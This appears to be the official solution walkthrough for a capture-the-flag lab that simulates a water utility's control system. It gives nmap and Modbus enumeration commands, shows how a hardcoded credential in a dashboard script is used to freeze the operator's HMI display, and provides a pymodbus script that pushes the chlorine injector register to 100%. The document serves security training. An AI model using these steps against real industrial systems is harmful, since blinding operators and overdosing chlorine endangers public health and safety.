# Pulse-Point Lab: Official Solution Walkthrough

## Scenario Overview
You have breached the perimeter of a regional water utility company. You've discovered an exposed Management Gateway (HMI) and the underlying Modbus PLC controlling the water treatment process. Your objective is to overload the Chlorine Injector to 100% capacity. 

However, there is a catch: the facility is actively monitored via a physical process feedback loop. If you manipulate the Modbus registers directly while the HMI is reporting live data, the human operator will immediately notice the spike and reset the systems back to a safe limit. You must find a way to manipulate the interface before executing your physical attack.

---

## Phase 1: Reconnaissance 

### 1. Identify Open Ports
Run an Nmap scan against the target IP to discover the exposed services.
```bash
nmap -sV -p- <TARGET_IP>
```
**Results:**
- **Port 80 (HTTP):** ScadaBR Industrial Control System Dashboard (HMI).
- **Port 502 (TCP):** Modbus TCP acting as the underlying Schneider Electric PLC.

### 2. Modbus Enumeration
Use Nmap's Modbus discover script to enumerate the holding registers within the PLC.
```bash
nmap --script modbus-discover -p 502 <TARGET_IP>
```
You will identify the active holding registers:
- **Register 4001**: Flow Rate (Setpoint: `500` L/min)
- **Register 4005**: Chlorine Injector (Setpoint: `20`%)

---

## Phase 2: Analyzing the HMI (Logic Flaw)

If you use a Modbus tool to force Register `4005` to `100` right now, you will notice the system immediately resets the value back to `20`. The operator is actively watching the dashboard (Port 80). 

We need to investigate the HMI to see if there is a way to manipulate what the operator sees.

1. Navigate to the web interface: `http://<TARGET_IP>`
2. Open your browser's **Developer Tools (F12)**.
3. Browse to the **Sources** or **Network** tab and inspect the frontend file `dashboard.js`.
4. You will discover a leftover developer comment containing hardcoded administrative credentials for a "Simulation Mode":
```javascript
/**
 * ScadaBR Premium - Dashboard Controller
 * 
 * DEV NOTE: 
 * Temporary Simulation Mode endpoint for debugging physical loop feedback.
 * To enable simulation mode when the pump is disconnected, use the API:
 * POST /api/simulation/enable
 * Headers: {
 *   "X-Scada-Admin": "<REDACTED_PASSWORD>" // TODO: Remove before production deploy!!
 * }
 */
```

---

## Phase 3: The Attack (Blinding the Feedback Loop)

To successfully inject the chlorine, we must execute a concurrent attack: blind the HMI, and then manipulate the physical process.

### 1. Enable Simulation Mode
Send an authenticated `POST` request to the API endpoint to enable the simulation. This will freeze the HMI dashboard at normal operating values (`500` flow, `20` chlorine), effectively blinding the automated operator.

You can use `curl` from your terminal:
```bash
curl -X POST http://<TARGET_IP>/api/simulation/enable \
     -H "X-Scada-Admin: <REDACTED_PASSWORD>"
```
*If you refresh the web dashboard, you will now see a small "Simulation Mode Active" warning tag. The interface is no longer pulling live data from Modbus.*

### 2. Modbus Injection
Now that the operator is relying on spoofed data, you are free to overwrite the Chlorine Injector register. You can do this using the `pymodbus` Python library.

Save the following as `exploit.py`:
```python
from pymodbus.client import ModbusTcpClient

TARGET_IP = "<TARGET_IP>"
PORT = 502

# Connect to the Modbus PLC
client = ModbusTcpClient(TARGET_IP, port=PORT)
client.connect()

# Overwrite Register 4005 (Chlorine Injector) to 100%
# Function Code 6: Write Single Register
client.write_register(4005, 100, slave=0)

print("[+] Chlorine Injector pushed to 100% capacity.")
client.close()
```

Run the script:
```bash
python3 exploit.py
```

### 3. Claim the Flag
Because the HMI is stuck in simulation mode, the operator does not see the spike on their screen and will not intervene. The background scoring engine will detect that Register `4005` has been successfully held at `100%` for 5 consecutive seconds.

Once the condition is met, the scoring engine provisions the flag directly to the web root. 

Navigate to:
`http://<TARGET_IP>/flag.txt`

**Flag:** `VulnOS{<REDACTED_FLAG>}`
